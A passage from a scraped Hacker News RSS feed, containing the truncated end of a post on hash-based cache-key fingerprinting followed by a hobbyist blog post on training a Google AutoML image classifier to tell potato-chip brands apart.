<a href="http://adapton.org/">self-adjusting or incremental computation</a>
for repeated MapReduce-style queries over a sliding window.
The key idea is to split the data set at stable boundaries (e.g., on
date change boundaries rather than 24 hours from the beginning of the
current time window) in order to expose memoisation opportunities, and
to do so recursively to repair around point mutations to older data.</p><p>Caching fully aggregated partial results works well for static
queries, like scheduled reports… but the first step towards creating
a great report is interactive data exploration, and that’s an activity
we strive to support well, even when drilling down tens of millions of
rich data points. That’s why we want to also cache intermediate
results, in order to improve response times when tweaking a saved
report, or when crafting ad hoc queries to better understand how and
when an application fails.</p><p>We must go back to a
<a href="http://www.umut-acar.org/self-adjusting-computation">more general incremental computation strategy</a>:
rather than only splitting up inputs, we want to stably partition the
data dependency graph of each query, in order to identify shared
subcomponents whose results can be reused. This finer grained
strategy surfaces opportunities to “resynchronise” computations, to
recognize when different expressions end up generating a subset of
identical results, enabling reuse in later steps. For example, when
someone updates a query by adding a selection predicate that only
rejects a small fraction of the data, we can expect to reuse some of
the post-selection work executed for earlier incarnations of the
query, if we remember to key on the selected data points rather than
the predicates.</p><p>The complication here is that these intermediate results tend to be
large. Useful analytical queries start small (a reasonable query
coupled with cache/transaction invalidation metadata to stand in for
the full data set), grow larger as we select data points, arrange them
in groups, and materialise their attributes, and shrink again at the
end, as we summarise data and throw out less interesting groups.</p><p>When caching the latter shrinking steps, where resynchronised reuse
opportunities abound and can save a lot of CPU time, we often
find that storing a fully materialised representation of the cache key
would take up more space than the cached result.</p><p>A classic approach in this situation is to fingerprint cache keys with
a cryptographic hash function like
<a href="https://en.wikipedia.org/wiki/BLAKE_(hash_function)">BLAKE</a>
or <a href="https://en.wikipedia.org/wiki/SHA-3">SHA-3</a>, and store a
compact (128 or 256 bits) fingerprint instead of the cache key: the
probability of a collision is then so low that we might as well assume
any false positive will have been caused by a bug in the code or a
hardware failure. For example,
<a href="https://users.ece.cmu.edu/~omutlu/pub/memory-errors-at-facebook_dsn15.pdf#page=3">a study of memory errors at Facebook</a>
found that uncorrectable memory errors affect 0.03% of servers each
month. Assuming a generous clock rate of 5 GHz, this means each
clock cycle may be afflicted by such a memory error with probability
\(\approx 2.2\cdot 10^{-20} &gt; 2^{-66}.\) If we can guarantee that
distinct inputs collide with probability significantly less than
\(2^{-66}\), e.g., \(&lt; 2^{-70},\) any collision is far
more likely to have been caused by a bug in our code or by
hardware failure than by the fingerprinting algorithm itself.</p><p>Using cryptographic hashes is certainly safe enough, but requires a lot of
CPU time, and, more importantly, worsens latency on smaller keys (for
which caching may not be that …</p></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://engineering.backtrace.io/2020-08-24-umash-fast-enough-almost-universal-fingerprinting/">https://engineering.backtrace.io/2020-08-24-umash-fast-enough-almost-universal-fingerprinting/</a></em></p>]]>
            </description>
            <link>https://engineering.backtrace.io/2020-08-24-umash-fast-enough-almost-universal-fingerprinting/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24269645</guid>
            <pubDate>Tue, 25 Aug 2020 09:51:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[DIY Artificial Intelligence: How I build a Potato Chips recognizer with no code]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24269631">thread link</a>) | @danroseai
<br/>
August 25, 2020 | https://danrose.ai/blog/potato-chips-recognizer-with-google-automl | <a href="https://web.archive.org/web/*/https://danrose.ai/blog/potato-chips-recognizer-with-google-automl">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page" role="main">
        
          <article data-page-sections="5ee8645a9b717b3e78ba3365" id="sections">
  
    <section data-section-id="5ee8645a9b717b3e78ba3367" data-controller="SectionWrapperController, MagicPaddingController" data-current-styles="{
  &quot;imageOverlayOpacity&quot; : 0.15,
  &quot;video&quot; : {
    &quot;playbackSpeed&quot; : 0.5,
    &quot;filter&quot; : 1,
    &quot;filterStrength&quot; : 0,
    &quot;zoom&quot; : 0
  },
  &quot;backgroundWidth&quot; : &quot;background-width--full-bleed&quot;,
  &quot;sectionHeight&quot; : &quot;section-height--medium&quot;,
  &quot;horizontalAlignment&quot; : &quot;horizontal-alignment--center&quot;,
  &quot;verticalAlignment&quot; : &quot;vertical-alignment--middle&quot;,
  &quot;contentWidth&quot; : &quot;content-width--wide&quot;,
  &quot;sectionTheme&quot; : &quot;white&quot;,
  &quot;sectionAnimation&quot; : &quot;none&quot;,
  &quot;backgroundMode&quot; : &quot;image&quot;
}" data-animation="none">
  
  <div>
    <div>
      
      
      <div data-content-field="main-content" data-item-id="">
  <article id="article-">
  
    <div>
      

      <div>
        <div><div data-layout-label="Post Body" data-type="item" id="item-5f26bde87e854c47e05b169f"><div><div><div data-block-type="2" id="block-60dc3150fccc97540532"><div><p>I have two passions. Potato chips and artificial intelligence. So why not combine those to show how easy it is to build your own AI models?&nbsp;</p><p>I could do that by crafting an AI, that can accurately predict different brands of potato chips. So that’s what I’m going to do here. I’ll show you how you can make your own AI models for your business or for fun. <strong>All this without coding.</strong><br></p><p>I built this AI on <a href="https://cloud.google.com/automl"><span>Google AutoML</span></a>. By doing that I only had to collect data and upload it to Google that in turn trained the model and deployed it ready to use. If you want a deeper discussion on AutoML you can read <a href="https://www.danrose.ai/blog/automl-is-it-useful"><span>my post here</span></a>.</p><p>You might wonder how expensive or difficult it was. Actually the total cost was around <strong>40 EUR and about three hours of work</strong>.</p><p>The result was pretty amazing. Even though I almost ate the training data before getting started I managed to make a model that accurately recognized the different kinds of chips.</p><h2>Why is this even relevant to you?</h2><p>This project might sound silly but you shouldn’t underestimate the business potential in this easy access to custom AI. If you have a business with a lot of spare parts that employees have to identify on the go, identify mistakes on an assembly line or other visual problems with high frequency then you can save a lot of money with very little effort.</p><p>Besides the visual problems as the one I’m tackling here you can also make your own Language models or forecast based on data in a database.</p><h2>How I did it</h2><p>Now for the fun stuff. I’ll go through the problem I’m trying to solve, how I got training data, how I trained the model and how I evaluated it.</p><h3>The problem</h3></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1596374505645_4904"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596374667861-9JEUPNDONCTZCBRUJEMM/ke17ZwdGBToddI8pDm48kDHPSfPanjkWqhH6pl6g5ph7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0mwONMR1ELp49Lyc52iWr5dNb1QJw9casjKdtTg1_-y4jz4ptJBmI9gQmbjSQnNGng/IMG_20200801_174153.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596374667861-9JEUPNDONCTZCBRUJEMM/ke17ZwdGBToddI8pDm48kDHPSfPanjkWqhH6pl6g5ph7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0mwONMR1ELp49Lyc52iWr5dNb1QJw9casjKdtTg1_-y4jz4ptJBmI9gQmbjSQnNGng/IMG_20200801_174153.jpg" data-image-dimensions="2500x1875" data-image-focal-point="0.5,0.5" alt="IMG_20200801_174153.jpg" data-load="false" data-image-id="5f26be779cf1312821f9e99f" data-type="image" src="https://danrose.ai/blog/IMG_20200801_174153.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1596374505645_5194"><div><p>So the problem is simple. I chose four different kinds of potato chips that I wanted the AI to be able to differentiate. To make the problem a little harder I chose two of them to be very similar.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1596374505645_7980"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596374757817-YW7GUER193GKXXOWSRGN/ke17ZwdGBToddI8pDm48kP--Gy_hAcl7mgvb9_zoAut7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UYW6-c2-nOiTzS0bbX-AuynKRuGejHNxHGae8e4Kgea0JvwGh1qtNWvMhYKnvaKhbA/scene00172.png" data-image="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596374757817-YW7GUER193GKXXOWSRGN/ke17ZwdGBToddI8pDm48kP--Gy_hAcl7mgvb9_zoAut7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UYW6-c2-nOiTzS0bbX-AuynKRuGejHNxHGae8e4Kgea0JvwGh1qtNWvMhYKnvaKhbA/scene00172.png" data-image-dimensions="1920x1088" data-image-focal-point="0.5,0.5" alt="scene00172.png" data-load="false" data-image-id="5f26bee278e49e62c8ca1487" data-type="image" src="https://danrose.ai/blog/scene00172.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="5" id="block-yui_3_17_2_1_1596374505645_10463"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596374802772-AYLU13AJVRTKR3DPV1XI/ke17ZwdGBToddI8pDm48kP--Gy_hAcl7mgvb9_zoAut7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UYW6-c2-nOiTzS0bbX-AuynKRuGejHNxHGae8e4Kgea0JvwGh1qtNWvMhYKnvaKhbA/scene00052.png" data-image="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596374802772-AYLU13AJVRTKR3DPV1XI/ke17ZwdGBToddI8pDm48kP--Gy_hAcl7mgvb9_zoAut7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UYW6-c2-nOiTzS0bbX-AuynKRuGejHNxHGae8e4Kgea0JvwGh1qtNWvMhYKnvaKhbA/scene00052.png" data-image-dimensions="1920x1088" data-image-focal-point="0.5,0.5" alt="scene00052.png" data-load="false" data-image-id="5f26bf0f6ae770371cfc9b7c" data-type="image" src="https://danrose.ai/blog/scene00052.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1596374505645_8269"><div><p>The images below are respectively “snack chips original” and “snack chips sour cream and onion”. As you can see they look very similar.</p><h2>Getting training data</h2><p>As I’m writing this I’m devouring the remaining training data. I’m a little sick of potato chips now but not ashamed at all. It’s a sacrifice I had to make in the name of AI.<br></p><p>Google recommends around 100 different examples for each label. I was lazy so I went a little below that with 289 images in total with 4 different labels.<br></p><p>Taking 289 would take a while so I did some cheating that you should do if you want to do a similar case. Instead of taking pictures I took video with my smartphone and extracted the images from the video.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1596374505645_15061"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596375090548-YPFPV6RDZUMXG4ZHVZ1B/ke17ZwdGBToddI8pDm48kHUzxcQwd2DgHE3KO6VtZClZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PI1qPlfs3HYKbanWcQQqBRZmpTq4czOe8Acgsq9n8pASg/ezgif-7-f5708715b22c.gif" data-image="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596375090548-YPFPV6RDZUMXG4ZHVZ1B/ke17ZwdGBToddI8pDm48kHUzxcQwd2DgHE3KO6VtZClZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PI1qPlfs3HYKbanWcQQqBRZmpTq4czOe8Acgsq9n8pASg/ezgif-7-f5708715b22c.gif" data-image-dimensions="800x450" data-image-focal-point="0.5,0.5" alt="ezgif-7-f5708715b22c.gif" data-load="false" data-image-id="5f26bfe6c74d304b66fc0728" data-type="image">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1596374505645_15350"><div><p>I used VLC player to extract the frames. VLC has a setting in video filters to extract frames from videos but I guess there is a lot of software out there that can do this for free.</p><p>After getting the images for training data ready I simply logged in to Google Cloud and enabled the AutoML Vision API.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1596374505645_28240"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596375153037-X34723CXDQBLC13PQ6XX/ke17ZwdGBToddI8pDm48kOYgNfBE3pTmL5XfhHR4-g97gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1URZssu81Ld-7FrwoxLhHEJd5Cl50eQY0vS3s-ErHaXsWm4bjm9DAHF2kOsIZRJKXnA/Screen+Shot+2020-08-02+at+14.48.04.png" data-image="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596375153037-X34723CXDQBLC13PQ6XX/ke17ZwdGBToddI8pDm48kOYgNfBE3pTmL5XfhHR4-g97gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1URZssu81Ld-7FrwoxLhHEJd5Cl50eQY0vS3s-ErHaXsWm4bjm9DAHF2kOsIZRJKXnA/Screen+Shot+2020-08-02+at+14.48.04.png" data-image-dimensions="2496x1448" data-image-focal-point="0.5,0.5" alt="Screen Shot 2020-08-02 at 14.48.04.png" data-load="false" data-image-id="5f26c0700ba3997952d493c5" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596375153037-X34723CXDQBLC13PQ6XX/ke17ZwdGBToddI8pDm48kOYgNfBE3pTmL5XfhHR4-g97gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1URZssu81Ld-7FrwoxLhHEJd5Cl50eQY0vS3s-ErHaXsWm4bjm9DAHF2kOsIZRJKXnA/Screen+Shot+2020-08-02+at+14.48.04.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1596374505645_28529"><p><br>After that I created a new dataset. In this case I chose single-label classification since it’s the simplest solution for the use case. If you need to identify several different object or even get a bounding box for the position of the object then that is a possibility too.</p></div><div data-block-type="5" id="block-yui_3_17_2_1_1596374505645_31298"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596375207786-V040HAI5WIA3H2CU9ZNC/ke17ZwdGBToddI8pDm48kGLi6xYBB2UyCEqI0Pc_jBN7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0raKnEK4LNhjn5BoF_7_GYE-gdvfyxhoPeDE6WiT2jOUQPRcov3m5hi8LiAGJBXlTg/Screen+Shot+2020-08-02+at+14.49.45.png" data-image="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596375207786-V040HAI5WIA3H2CU9ZNC/ke17ZwdGBToddI8pDm48kGLi6xYBB2UyCEqI0Pc_jBN7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0raKnEK4LNhjn5BoF_7_GYE-gdvfyxhoPeDE6WiT2jOUQPRcov3m5hi8LiAGJBXlTg/Screen+Shot+2020-08-02+at+14.49.45.png" data-image-dimensions="2500x1450" data-image-focal-point="0.5,0.5" alt="Screen Shot 2020-08-02 at 14.49.45.png" data-load="false" data-image-id="5f26c0a3a9e7856699c0de8c" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596375207786-V040HAI5WIA3H2CU9ZNC/ke17ZwdGBToddI8pDm48kGLi6xYBB2UyCEqI0Pc_jBN7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0raKnEK4LNhjn5BoF_7_GYE-gdvfyxhoPeDE6WiT2jOUQPRcov3m5hi8LiAGJBXlTg/Screen+Shot+2020-08-02+at+14.49.45.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1596374505645_31587"><p>With the dataset created I know just bulk uploaded potato chips with the UI and put on labels.<br></p></div><div data-block-type="5" id="block-yui_3_17_2_1_1596374505645_34177"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596375264281-RW4D3BT3Z27ELG4NPL0U/ke17ZwdGBToddI8pDm48kBCaMk_a5jnPkzckNsOsCmN7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0vc___Vi-l6i_tO81lSXAWFK-5YqTXot-_p5YIxO6Alsb_bOgbgE6mRwf-vgKTQPMg/Screen+Shot+2020-08-02+at+14.49.57.png" data-image="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596375264281-RW4D3BT3Z27ELG4NPL0U/ke17ZwdGBToddI8pDm48kBCaMk_a5jnPkzckNsOsCmN7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0vc___Vi-l6i_tO81lSXAWFK-5YqTXot-_p5YIxO6Alsb_bOgbgE6mRwf-vgKTQPMg/Screen+Shot+2020-08-02+at+14.49.57.png" data-image-dimensions="2500x1397" data-image-focal-point="0.5,0.5" alt="Screen Shot 2020-08-02 at 14.49.57.png" data-load="false" data-image-id="5f26c0d6028ea31cb0c01ad3" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596375264281-RW4D3BT3Z27ELG4NPL0U/ke17ZwdGBToddI8pDm48kBCaMk_a5jnPkzckNsOsCmN7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0vc___Vi-l6i_tO81lSXAWFK-5YqTXot-_p5YIxO6Alsb_bOgbgE6mRwf-vgKTQPMg/Screen+Shot+2020-08-02+at+14.49.57.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1596374505645_34466"><div><p>Easy right? The entire dataset is now ready.</p><h2>Training</h2><p>After getting data I trained the model. I simply clicked “Train new model” and got presented with a few different options. First I chose Cloud hosted. This is for getting the model hosted at Google. ”Edge”, the alternative, is if you want to deploy on devices such as Raspberry Pi.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1596374505645_36444"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596375320663-O49CUT6JMCGT2HYQR000/ke17ZwdGBToddI8pDm48kCHV4JP_uPLZT7_OEP-kOap7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0rgHhgU1kmzSCGpabQyjAEJfc6ifPVsNDj16at0jXsT90RiD7LBvSy379FoW-lGkkg/Screen+Shot+2020-08-02+at+14.59.07.png" data-image="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596375320663-O49CUT6JMCGT2HYQR000/ke17ZwdGBToddI8pDm48kCHV4JP_uPLZT7_OEP-kOap7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0rgHhgU1kmzSCGpabQyjAEJfc6ifPVsNDj16at0jXsT90RiD7LBvSy379FoW-lGkkg/Screen+Shot+2020-08-02+at+14.59.07.png" data-image-dimensions="2500x1506" data-image-focal-point="0.5,0.5" alt="Screen Shot 2020-08-02 at 14.59.07.png" data-load="false" data-image-id="5f26c116b436d408b92f5330" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596375320663-O49CUT6JMCGT2HYQR000/ke17ZwdGBToddI8pDm48kCHV4JP_uPLZT7_OEP-kOap7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0rgHhgU1kmzSCGpabQyjAEJfc6ifPVsNDj16at0jXsT90RiD7LBvSy379FoW-lGkkg/Screen+Shot+2020-08-02+at+14.59.07.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1596374505645_38869"><div><p>Next I chose the recommended node hour budget. One node hour is about 3 USD. I also clicked “deploy model” so it’s ready to use.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1596374505645_38580"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596375348005-U9MOQ2533XJ5XGKQDTH7/ke17ZwdGBToddI8pDm48kKDD9K8EWjxZpuR9yHkNE4V7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0s2CZOjZ4kkgxkahrfeDuWXrqiwJ1R_kUl8avHlfFlZsQFve0KgIJ3Op-WvcgG54Mg/Screen+Shot+2020-08-02+at+15.01.40.png" data-image="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596375348005-U9MOQ2533XJ5XGKQDTH7/ke17ZwdGBToddI8pDm48kKDD9K8EWjxZpuR9yHkNE4V7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0s2CZOjZ4kkgxkahrfeDuWXrqiwJ1R_kUl8avHlfFlZsQFve0KgIJ3Op-WvcgG54Mg/Screen+Shot+2020-08-02+at+15.01.40.png" data-image-dimensions="2500x1616" data-image-focal-point="0.5,0.5" alt="Screen Shot 2020-08-02 at 15.01.40.png" data-load="false" data-image-id="5f26c13035718e4a35afc2c3" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596375348005-U9MOQ2533XJ5XGKQDTH7/ke17ZwdGBToddI8pDm48kKDD9K8EWjxZpuR9yHkNE4V7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0s2CZOjZ4kkgxkahrfeDuWXrqiwJ1R_kUl8avHlfFlZsQFve0KgIJ3Op-WvcgG54Mg/Screen+Shot+2020-08-02+at+15.01.40.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1596374505645_45675"><div><p>When clicking start training the model’s training. In my experience this is 2-3 hours. Google will send you an email when it’s done, so you don’t have to sit there waiting.</p><h2>The costs</h2><p>I wrote in the introduction that this project had a cost of 40 EUR and three hours of work. To give you a better picture then here’s the costs in a bit more detail.</p><p>Potato chips: 10 EUR.&nbsp;</p><p>Training the model: 30 EUR.</p><p>There will also be some costs associated with hosting data, calling the Gcloud API when using the model and hosting the model. I haven’t put these costs in since they vary a lot based on the use case. That being said it’s usually not a significant cost.</p><p>As a little bonus I actually didn’t spend any real money on this project. When you sign up for Google Cloud they give you a 300 USD voucher to spend on&nbsp;</p><h2>Results</h2><p>Alright. Now for the results. The model actually did pretty well. I expected it to have a lot of trouble with the similar looking kind of chips but it usually guessed the right one with more that 80% confidence. Pretty nice for a few hours of work.</p><p>I tested the confidence directly in the cloud UI as a sanity check.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1596374505645_51339"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596375483274-61YNLFP5H638851IJMJH/ke17ZwdGBToddI8pDm48kJkYH13nBiaG57XymelfPbF7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1Uc9UkuhcffCPttvW4WBGNe9RETMIZH93Wv--W4mLu0m2G6v6ULRah83RgHXAWD5lbQ/Screen+Shot+2020-08-02+at+13.13.12.png" data-image="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596375483274-61YNLFP5H638851IJMJH/ke17ZwdGBToddI8pDm48kJkYH13nBiaG57XymelfPbF7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1Uc9UkuhcffCPttvW4WBGNe9RETMIZH93Wv--W4mLu0m2G6v6ULRah83RgHXAWD5lbQ/Screen+Shot+2020-08-02+at+13.13.12.png" data-image-dimensions="2268x1880" data-image-focal-point="0.5,0.5" alt="Screen Shot 2020-08-02 at 13.13.12.png" data-load="false" data-image-id="5f26c1ac0dc876268b21f879" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596375483274-61YNLFP5H638851IJMJH/ke17ZwdGBToddI8pDm48kJkYH13nBiaG57XymelfPbF7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1Uc9UkuhcffCPttvW4WBGNe9RETMIZH93Wv--W4mLu0m2G6v6ULRah83RgHXAWD5lbQ/Screen+Shot+2020-08-02+at+13.13.12.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1596374505645_51628"><p>When the model is ready you also get some analytics about the model.<br></p></div><div data-block-type="5" id="block-yui_3_17_2_1_1596374505645_53690"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596375534840-SP4HHBADJ9XGQQZUVNSU/ke17ZwdGBToddI8pDm48kBCppz4f318kQhgOkLoMjtx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UUHjNPxecGPLsNPOs7j5ghY0WJ3f6AT1P4UchDw8jTgvJvwGh1qtNWvMhYKnvaKhbA/Screen+Shot+2020-08-02+at+13.11.57.png" data-image="https://images.squarespace-cdn.com/content/v1/5ee8617eedf4d13dcedda79e/1596375534840-SP4HHBADJ9XGQQZUVNSU/ke17ZwdGBToddI8pDm48kBCppz4f318kQhgOkLoMjtx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UUHjNPxecGPLsNPOs7j5ghY0WJ3f6AT1P4UchDw8jTgvJvwGh1qtNWvMhYKnvaKhbA/Screen+Shot+2020-08-02+at+13.11.57.png" data-image-dimensions="2200x1758" data-image-focal-point="0.5,0.5" alt="Screen Shot 2020-08-02 at 13.11.57.png" data-load="false" 